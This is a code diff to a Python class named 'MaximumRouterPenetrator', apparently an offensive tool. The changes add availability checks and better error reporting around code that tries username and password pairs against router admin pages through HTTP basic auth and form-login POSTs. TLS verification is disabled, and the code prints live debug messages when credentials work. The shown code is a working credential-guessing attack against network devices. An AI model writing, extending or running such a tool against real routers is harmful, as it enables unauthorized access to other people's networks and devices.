@@ -2005,11 +2005,14 @@ class MaximumRouterPenetrator:
                 base_url = f"{strategy['protocol']}://{ip}:{strategy['port']}"
                 
                 if strategy['method'] == 'basic_auth':
-                    session = requests.Session()
-                    response = session.get(f"{base_url}/admin/", 
-                                         auth=HTTPBasicAuth(username, password), 
-                                         timeout=self.performance_config['timeouts']['connection'],
-                                         verify=False, allow_redirects=False)
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        response = session.get(f"{base_url}/admin/", 
+                                             auth=HTTPBasicAuth(username, password), 
+                                             timeout=self.performance_config['timeouts']['connection'],
+                                             verify=False, allow_redirects=False)
+                    else:
+                        continue
                     
                     if response.status_code == 200:
                         if verbose:
@@ -2024,21 +2027,24 @@ class MaximumRouterPenetrator:
                         }
                 
                 elif strategy['method'] == 'form_login':
-                    session = requests.Session()
-                    response = session.get(f"{base_url}/", 
-                                         timeout=self.performance_config['timeouts']['connection'],
-                                         verify=False, allow_redirects=False)
-                    
-                    login_data = {
-                        'username': username, 'password': password,
-                        'user': username, 'pass': password,
-                        'admin': username, 'adminpass': password
-                    }
-                    
-                    login_response = session.post(f"{base_url}/", 
-                                                data=login_data, 
-                                                timeout=self.performance_config['timeouts']['connection'],
-                                                verify=False, allow_redirects=False)
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        response = session.get(f"{base_url}/", 
+                                             timeout=self.performance_config['timeouts']['connection'],
+                                             verify=False, allow_redirects=False)
+                        
+                        login_data = {
+                            'username': username, 'password': password,
+                            'user': username, 'pass': password,
+                            'admin': username, 'adminpass': password
+                        }
+                        
+                        login_response = session.post(f"{base_url}/", 
+                                                    data=login_data, 
+                                                    timeout=self.performance_config['timeouts']['connection'],
+                                                    verify=False, allow_redirects=False)
+                    else:
+                        continue
                     
                     if (login_response.status_code in [200, 302, 301] and
                         'error' not in login_response.text.lower() and
@@ -4255,13 +4261,10 @@ class MaximumRouterPenetrator:
                                         print(f"                  ✅ LIVE DEBUG: Form auth success on {protocol}:{port}!")
                                     
                                     return auth_result
-                        except:
+                        except Exception as e:
+                            if verbose and 'timed out' not in str(e).lower():
+                                print(f"                  ❌ LIVE DEBUG: Form auth error: {str(e)[:50]}")
                             continue
-            
-            except Exception as e:
-                if verbose:
-                    print(f"                  ❌ LIVE DEBUG: Error: {str(e)}")
-                continue
         
         if verbose:
             print(f"            ❌ LIVE DEBUG: No working credentials on {protocol}:{port}")
